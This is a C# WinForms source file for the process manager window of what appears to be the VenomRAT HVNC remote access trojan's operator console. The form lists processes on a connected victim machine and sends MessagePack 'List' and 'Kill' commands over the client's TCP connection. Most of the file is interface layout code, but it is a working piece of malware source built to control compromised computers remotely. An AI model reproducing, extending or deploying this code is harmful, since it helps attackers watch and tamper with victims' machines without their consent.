using System;
using System.ComponentModel;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using Server;
using Server.MessagePack;
using VenomRAT_HVNC.Server.Connection;

namespace VenomRAT_HVNC.Server.Forms
{
    public class FormProcessManager : Form
    {
        private IContainer components;

        private ColumnHeader lv_name;

        private ColumnHeader lv_id;

        public ImageList imageList1;

        private ContextMenuStrip contextMenuStrip1;

        private ToolStripMenuItem killToolStripMenuItem;

        private ToolStripMenuItem refreshToolStripMenuItem;

        public System.Windows.Forms.Timer timer1;

        private Guna2Panel guna2Panel1;

        public ListView listView1;

        private Label label1;

        private Guna2ControlBox guna2ControlBox1;

        private Guna2Separator guna2Separator2;

        private Guna2Separator guna2Separator1;

        private Guna2DragControl guna2DragControl1;

        private Guna2BorderlessForm guna2BorderlessForm1;

        public Form1 F { get; set; }

        internal Clients Client { get; set; }

        internal Clients ParentClient { get; set; }

        public FormProcessManager()
        {
            InitializeComponent();
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            try
            {
                if (!Client.TcpClient.Connected || !ParentClient.TcpClient.Connected)
                {
                    Close();
                }
            }
            catch
            {
                Close();
            }
        }

        private async void killToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count <= 0)
            {
                return;
            }
            foreach (ListViewItem P in listView1.SelectedItems)
            {
                await Task.Run(delegate
                {
                    MsgPack msgPack = new MsgPack();
                    msgPack.ForcePathObject("Pac_ket").AsString = "processManager";
                    msgPack.ForcePathObject("Option").AsString = "Kill";
                    msgPack.ForcePathObject("ID").AsString = P.SubItems[lv_id.Index].Text;
                    ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
                });
            }
        }

        private void refreshToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ThreadPool.QueueUserWorkItem(delegate
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Pac_ket").AsString = "processManager";
                msgPack.ForcePathObject("Option").AsString = "List";
                ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
            });
        }

        private void FormProcessManager_FormClosed(object sender, FormClosedEventArgs e)
        {
            try
            {
                ThreadPool.QueueUserWorkItem(delegate
                {
                    Client?.Disconnected();
                });
            }
            catch
            {
            }
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing && components != null)
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        private void InitializeComponent()
        {
            components = new System.ComponentModel.Container();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(global::VenomRAT_HVNC.Server.Forms.FormProcessManager));
            listView1 = new System.Windows.Forms.ListView();
            lv_name = new System.Windows.Forms.ColumnHeader();
            lv_id = new System.Windows.Forms.ColumnHeader();
            contextMenuStrip1 = new System.Windows.Forms.ContextMenuStrip(components);
            killToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            refreshToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            imageList1 = new System.Windows.Forms.ImageList(components);
            timer1 = new System.Windows.Forms.Timer(components);
            guna2Panel1 = new Guna.UI2.WinForms.Guna2Panel();
            guna2Separator2 = new Guna.UI2.WinForms.Guna2Separator();
            guna2Separator1 = new Guna.UI2.WinForms.Guna2Separator();
            guna2ControlBox1 = new Guna.UI2.WinForms.Guna2ControlBox();
            label1 = new System.Windows.Forms.Label();
            guna2DragControl1 = new Guna.UI2.WinForms.Guna2DragControl(components);
            guna2BorderlessForm1 = new Guna.UI2.WinForms.Guna2BorderlessForm(components);
            contextMenuStrip1.SuspendLayout();
            guna2Panel1.SuspendLayout();
            SuspendLayout();
            listView1.BackColor = System.Drawing.Color.FromArgb(30, 30, 30);
            listView1.BorderStyle = System.Windows.Forms.BorderStyle.None;
            listView1.Columns.AddRange(new System.Windows.Forms.ColumnHeader[2] { lv_name, lv_id });
            listView1.ContextMenuStrip = contextMenuStrip1;
            listView1.Dock = System.Windows.Forms.DockStyle.Bottom;
            listView1.Enabled = false;
            listView1.ForeColor = System.Drawing.Color.Gainsboro;
            listView1.FullRowSelect = true;
            listView1.HeaderStyle = System.Windows.Forms.ColumnHeaderStyle.Nonclickable;
            listView1.HideSelection = false;
            listView1.Location = new System.Drawing.Point(0, 43);
            listView1.Margin = new System.Windows.Forms.Padding(2);
            listView1.Name = "listView1";
            listView1.ShowGroups = false;
            listView1.ShowItemToolTips = true;
            listView1.Size = new System.Drawing.Size(647, 523);
            listView1.SmallImageList = imageList1;
            listView1.Sorting = System.Windows.Forms.SortOrder.Ascending;
            listView1.TabIndex = 0;
            listView1.UseCompatibleStateImageBehavior = false;
            listView1.View = System.Windows.Forms.View.Details;
            lv_name.Text = "Name";
            lv_name.Width = 283;
            lv_id.Text = "ID";
            lv_id.Width = 81;
            contextMenuStrip1.ImageScalingSize = new System.Drawing.Size(24, 24);
            contextMenuStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[2] { killToolStripMenuItem, refreshToolStripMenuItem });
            contextMenuStrip1.Name = "contextMenuStrip1";
            contextMenuStrip1.Size = new System.Drawing.Size(114, 48);
            killToolStripMenuItem.Name = "killToolStripMenuItem";
            killToolStripMenuItem.Size = new System.Drawing.Size(113, 22);
            killToolStripMenuItem.Text = "Kill";
            killToolStripMenuItem.Click += new System.EventHandler(killToolStripMenuItem_Click);
            refreshToolStripMenuItem.Name = "refreshToolStripMenuItem";
            refreshToolStripMenuItem.Size = new System.Drawing.Size(113, 22);
            refreshToolStripMenuItem.Text = "Refresh";
            refreshToolStripMenuItem.Click += new System.EventHandler(refreshToolStripMenuItem_Click);
            imageList1.ColorDepth = System.Windows.Forms.ColorDepth.Depth32Bit;
            imageList1.ImageSize = new System.Drawing.Size(32, 32);
            imageList1.TransparentColor = System.Drawing.Color.Transparent;
            timer1.Interval = 1000;
            timer1.Tick += new System.EventHandler(timer1_Tick);
            guna2Panel1.BackColor = System.Drawing.Color.FromArgb(24, 24, 24);
            guna2Panel1.Controls.Add(guna2Separator2);
            guna2Panel1.Controls.Add(guna2Separator1);
            guna2Panel1.Controls.Add(guna2ControlBox1);
            guna2Panel1.Controls.Add(label1);
            guna2Panel1.Dock = System.Windows.Forms.DockStyle.Top;
            guna2Panel1.ForeColor = System.Drawing.Color.Gainsboro;
            guna2Panel1.Location = new System.Drawing.Point(0, 0);
            guna2Panel1.Name = "guna2Panel1";
            guna2Panel1.ShadowDecoration.Parent = guna2Panel1;
            guna2Panel1.Size = new System.Drawing.Size(647, 43);
            guna2Panel1.TabIndex = 1;
            guna2Separator2.FillColor = System.Drawing.Color.FromArgb(8, 104, 81);
            guna2Separator2.FillStyle = System.Drawing.Drawing2D.DashStyle.Custom;
            guna2Separator2.FillThickness = 2;
            guna2Separator2.Location = new System.Drawing.Point(0, 35);
            guna2Separator2.Name = "guna2Separator2";
            guna2Separator2.Size = new System.Drawing.Size(647, 10);
            guna2Separator2.TabIndex = 130;
            guna2Separator1.FillColor = System.Drawing.Color.FromArgb(8, 104, 81);
            guna2Separator1.FillStyle = System.Drawing.Drawing2D.DashStyle.Custom;
            guna2Separator1.FillThickness = 2;
            guna2Separator1.Location = new System.Drawing.Point(0, -4);
            guna2Separator1.Name = "guna2Separator1";
            guna2Separator1.Size = new System.Drawing.Size(647, 10);
            guna2Separator1.TabIndex = 130;
            guna2ControlBox1.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
            guna2ControlBox1.BackColor = System.Drawing.Color.Transparent;
            guna2ControlBox1.FillColor = System.Drawing.Color.Transparent;
            guna2ControlBox1.HoverState.Parent = guna2ControlBox1;
            guna2ControlBox1.IconColor = System.Drawing.Color.White;
            guna2ControlBox1.Location = new System.Drawing.Point(603, 4);
            guna2ControlBox1.Name = "guna2ControlBox1";
            guna2ControlBox1.ShadowDecoration.Parent = guna2ControlBox1;
            guna2ControlBox1.Size = new System.Drawing.Size(41, 32);
            guna2ControlBox1.TabIndex = 17;
            label1.AutoSize = true;
            label1.Font = new System.Drawing.Font("Microsoft Sans Serif", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            label1.Location = new System.Drawing.Point(3, 9);
            label1.Name = "label1";
            label1.Size = new System.Drawing.Size(133, 20);
            label1.TabIndex = 0;
            label1.Text = "Process Manager";
            guna2DragControl1.TargetControl = guna2Panel1;
            guna2BorderlessForm1.AnimateWindow = true;
            guna2BorderlessForm1.AnimationType = Guna.UI2.WinForms.Guna2BorderlessForm.AnimateWindowType.AW_HOR_POSITIVE;
            guna2BorderlessForm1.ContainerControl = this;
            guna2BorderlessForm1.DockIndicatorColor = System.Drawing.Color.FromArgb(8, 104, 81);
            guna2BorderlessForm1.ShadowColor = System.Drawing.Color.FromArgb(8, 104, 81);
            base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
            base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            base.ClientSize = new System.Drawing.Size(647, 566);
            base.Controls.Add(guna2Panel1);
            base.Controls.Add(listView1);
            base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
            base.Margin = new System.Windows.Forms.Padding(2);
            base.Name = "FormProcessManager";
            base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            Text = "Process Manager";
            base.FormClosed += new System.Windows.Forms.FormClosedEventHandler(FormProcessManager_FormClosed);
            contextMenuStrip1.ResumeLayout(false);
            guna2Panel1.ResumeLayout(false);
            guna2Panel1.PerformLayout();
            ResumeLayout(false);
        }
    }
}